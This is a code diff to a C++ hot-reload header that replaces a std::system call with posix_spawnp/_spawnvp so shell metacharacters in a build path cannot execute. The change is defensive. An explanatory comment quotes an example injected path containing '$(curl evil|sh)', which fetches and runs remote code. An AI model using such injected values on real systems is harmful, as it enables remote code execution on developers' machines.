@@ -16,8 +16,13 @@
 // Note: this header is included BY TrussC.h (after all core types are defined).
 #ifdef _WIN32
 #include <windows.h>
+#include <process.h>
 #else
 #include <dlfcn.h>
+#include <spawn.h>
+#include <sys/wait.h>
+#include <cstring>
+extern char** environ;
 #endif
 #include <filesystem>
 #include <chrono>
@@ -209,6 +214,48 @@ inline string findCMake() {
 }
 
 // ---------------------------------------------------------------------------
+// Spawn a process with explicit argv (no shell). Equivalent in spirit to
+// trusscli's runProcess(). We bypass std::system because the build dir is
+// derived from fs::canonical(getExecutablePath()) — outside the developer's
+// direct control once the binary is built and distributed — and may contain
+// shell metacharacters that would be expanded by /bin/sh -c "...".
+// Specifically, $(cmd) and `cmd` are evaluated even inside double quotes,
+// so a path like ~/projects/demo$(curl evil|sh)/ would execute the embedded
+// command on every rebuild. Passing argv directly to posix_spawnp /
+// _spawnvp removes the shell from the loop entirely; any metacharacters
+// become literal argument bytes to cmake.
+// ---------------------------------------------------------------------------
+inline int runBuildCommand(const vector<string>& argv) {
+    if (argv.empty()) return -1;
+
+#ifdef _WIN32
+    vector<const char*> cargv;
+    cargv.reserve(argv.size() + 1);
+    for (const auto& a : argv) cargv.push_back(a.c_str());
+    cargv.push_back(nullptr);
+    return (int)_spawnvp(_P_WAIT, cargv[0], cargv.data());
+#else
+    vector<char*> cargv;
+    cargv.reserve(argv.size() + 1);
+    for (const auto& a : argv) cargv.push_back(const_cast<char*>(a.c_str()));
+    cargv.push_back(nullptr);
+    pid_t pid;
+    int err = posix_spawnp(&pid, cargv[0], nullptr, nullptr,
+                            cargv.data(), environ);
+    if (err != 0) {
+        std::cerr << "[HotReload] failed to spawn '" << argv[0]
+                  << "': " << std::strerror(err) << "\n";
+        return -1;
+    }
+    int status = 0;
+    waitpid(pid, &status, 0);
+    if (WIFEXITED(status))   return WEXITSTATUS(status);
+    if (WIFSIGNALED(status)) return 128 + WTERMSIG(status);
+    return -1;
+#endif
+}
+
+// ---------------------------------------------------------------------------
 // Hot reload host — manages the Guest lifecycle
 // ---------------------------------------------------------------------------
 
@@ -317,9 +364,11 @@ struct Host {
         string cmake = findCMake();
         logNotice("HotReload") << "Rebuilding guest...";
 
-        // Only rebuild the guest target — fast incremental build
-        string cmd = cmake + " --build \"" + buildDir + "\" --target guest --parallel";
-        int rc = std::system(cmd.c_str());
+        // Only rebuild the guest target — fast incremental build.
+        // argv is passed directly to posix_spawnp / _spawnvp — no shell
+        // is involved, so $(...), ``, ; etc. in buildDir cannot run.
+        int rc = runBuildCommand({cmake, "--build", buildDir,
+                                  "--target", "guest", "--parallel"});
         if (rc != 0) {
             logError() << "[HotReload] Build failed (exit code " << rc << ")";
             return false;
